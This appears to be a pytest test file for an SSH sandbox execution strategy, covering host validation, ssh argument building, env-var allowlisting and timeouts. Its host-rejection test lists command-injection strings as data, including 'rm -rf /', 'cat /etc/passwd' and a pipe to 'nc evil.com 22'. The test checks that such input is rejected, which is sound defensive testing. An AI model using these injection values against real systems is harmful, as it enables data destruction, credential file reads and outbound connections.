"""Tests for SSHSandboxStrategy (Phase 1.2).

We mock ``asyncio.create_subprocess_exec`` so tests don't need a real
remote host. Two layers:

- Pure-Python validation tests (host regex, missing config) — never
  spawn a process.
- Behavioural tests with a mocked subprocess — verify the wrapped argv
  shape, env filtering, timeout handling, cwd injection.
"""

from __future__ import annotations

import asyncio
import shutil
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from opencomputer.sandbox import SSHSandboxStrategy
from opencomputer.sandbox.ssh import _validate_host
from plugin_sdk.sandbox import SandboxConfig, SandboxUnavailable

# ---------- Host validation ----------


@pytest.mark.parametrize("host", ["user@host", "user@10.0.0.1", "user@host.example.com",
                                   "root@vps", "host", "ubuntu@ec2-1-2-3-4.compute.amazonaws.com"])
def test_validate_host_accepts_safe(host: str) -> None:
    assert _validate_host(host) == host


@pytest.mark.parametrize("bad", [
    "user@host;rm -rf /",
    "user@host && cat /etc/passwd",
    "user@host`whoami`",
    "user@host$(id)",
    "user with space@host",
    "user@host\nattack",
    "user@host|nc evil.com 22",
    "@host",       # missing user
    "user@",       # missing host
    "",            # empty
    "user@@host",  # double @
])
def test_validate_host_rejects_unsafe(bad: str) -> None:
    with pytest.raises(SandboxUnavailable):
        _validate_host(bad)


def test_validate_host_rejects_none() -> None:
    with pytest.raises(SandboxUnavailable, match="requires"):
        _validate_host(None)


# ---------- Strategy availability ----------


def test_strategy_name_is_ssh() -> None:
    assert SSHSandboxStrategy.name == "ssh"


def test_is_available_true_when_ssh_on_path() -> None:
    s = SSHSandboxStrategy()
    if shutil.which("ssh") is not None:
        assert s.is_available() is True


def test_is_available_false_when_ssh_missing(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("opencomputer.sandbox.ssh.shutil.which", lambda b: None)
    s = SSHSandboxStrategy()
    assert s.is_available() is False


# ---------- explain() — dry-run argv shape ----------


def test_explain_builds_ssh_argv_with_safe_options() -> None:
    s = SSHSandboxStrategy()
    cfg = SandboxConfig(strategy="ssh", ssh_host="user@host")
    argv = s.explain(["echo", "hi there"], config=cfg)
    assert argv[0] == "ssh"
    assert "user@host" in argv
    assert "BatchMode=yes" in argv
    assert "ConnectTimeout=10" in argv
    # The remote command goes last and is shlex-joined (so the space in
    # "hi there" is escaped properly).
    assert argv[-1] == "echo 'hi there'"


def test_explain_raises_on_unsafe_host() -> None:
    s = SSHSandboxStrategy()
    cfg = SandboxConfig(strategy="ssh", ssh_host="user@host;evil")
    with pytest.raises(SandboxUnavailable):
        s.explain(["echo", "hi"], config=cfg)


# ---------- run() — mocked subprocess ----------


def _make_mock_process(stdout: bytes = b"ok\n", stderr: bytes = b"", returncode: int = 0):
    proc = MagicMock()
    proc.communicate = AsyncMock(return_value=(stdout, stderr))
    proc.returncode = returncode
    proc.kill = MagicMock()
    proc.wait = AsyncMock(return_value=None)
    return proc


def test_run_invokes_ssh_with_remote_command() -> None:
    s = SSHSandboxStrategy()
    cfg = SandboxConfig(strategy="ssh", ssh_host="user@host")
    captured = {}

    async def fake_create(*args, **kwargs):
        captured["args"] = args
        return _make_mock_process(stdout=b"ok\n")

    with patch("opencomputer.sandbox.ssh.shutil.which", return_value="/usr/bin/ssh"), \
         patch("asyncio.create_subprocess_exec", side_effect=fake_create):
        result = asyncio.run(s.run(["echo", "ok"], config=cfg))

    assert result.exit_code == 0
    assert result.stdout == "ok\n"
    assert result.strategy_name == "ssh"
    assert captured["args"][0] == "ssh"
    assert "user@host" in captured["args"]
    # Remote command must be shlex-joined as the last positional arg
    assert captured["args"][-1] == "echo ok"


def test_run_injects_cwd_via_cd_prefix() -> None:
    s = SSHSandboxStrategy()
    cfg = SandboxConfig(strategy="ssh", ssh_host="host")
    captured = {}

    async def fake_create(*args, **kwargs):
        captured["args"] = args
        return _make_mock_process()

    with patch("opencomputer.sandbox.ssh.shutil.which", return_value="/usr/bin/ssh"), \
         patch("asyncio.create_subprocess_exec", side_effect=fake_create):
        asyncio.run(s.run(["echo", "hi"], config=cfg, cwd="/tmp/work"))

    assert captured["args"][-1].startswith("cd /tmp/work && ")


def test_run_strips_env_vars_outside_allowlist(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("SECRET_KEY", "leakme")
    monkeypatch.setenv("PATH", "/usr/bin")
    s = SSHSandboxStrategy()
    cfg = SandboxConfig(strategy="ssh", ssh_host="host", allowed_env_vars=("PATH",))
    captured = {}

    async def fake_create(*args, **kwargs):
        captured["env"] = kwargs.get("env")
        return _make_mock_process()

    with patch("opencomputer.sandbox.ssh.shutil.which", return_value="/usr/bin/ssh"), \
         patch("asyncio.create_subprocess_exec", side_effect=fake_create):
        asyncio.run(s.run(["echo", "x"], config=cfg))

    assert "PATH" in captured["env"]
    assert "SECRET_KEY" not in captured["env"]


def test_run_unavailable_when_ssh_missing(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("opencomputer.sandbox.ssh.shutil.which", lambda b: None)
    s = SSHSandboxStrategy()
    cfg = SandboxConfig(strategy="ssh", ssh_host="host")
    with pytest.raises(SandboxUnavailable, match="not found"):
        asyncio.run(s.run(["echo", "x"], config=cfg))


def test_run_timeout_returns_sentinel() -> None:
    s = SSHSandboxStrategy()
    cfg = SandboxConfig(strategy="ssh", ssh_host="host", cpu_seconds_limit=1)

    async def slow_communicate(input=None):
        await asyncio.sleep(5)
        return b"", b""

    proc = MagicMock()
    proc.communicate = AsyncMock(side_effect=slow_communicate)
    proc.kill = MagicMock()
    proc.wait = AsyncMock(return_value=None)

    async def fake_create(*args, **kwargs):
        return proc

    with patch("opencomputer.sandbox.ssh.shutil.which", return_value="/usr/bin/ssh"), \
         patch("asyncio.create_subprocess_exec", side_effect=fake_create):
        result = asyncio.run(s.run(["sleep", "5"], config=cfg))

    assert result.exit_code < 0
    assert "timeout" in result.stderr.lower()
    proc.kill.assert_called()


# ---------- runner._named_strategy dispatch ----------


def test_runner_named_strategy_resolves_ssh() -> None:
    from opencomputer.sandbox.runner import _named_strategy

    if shutil.which("ssh") is None:
        with pytest.raises(SandboxUnavailable):
            _named_strategy("ssh")
    else:
        s = _named_strategy("ssh")
        assert isinstance(s, SSHSandboxStrategy)
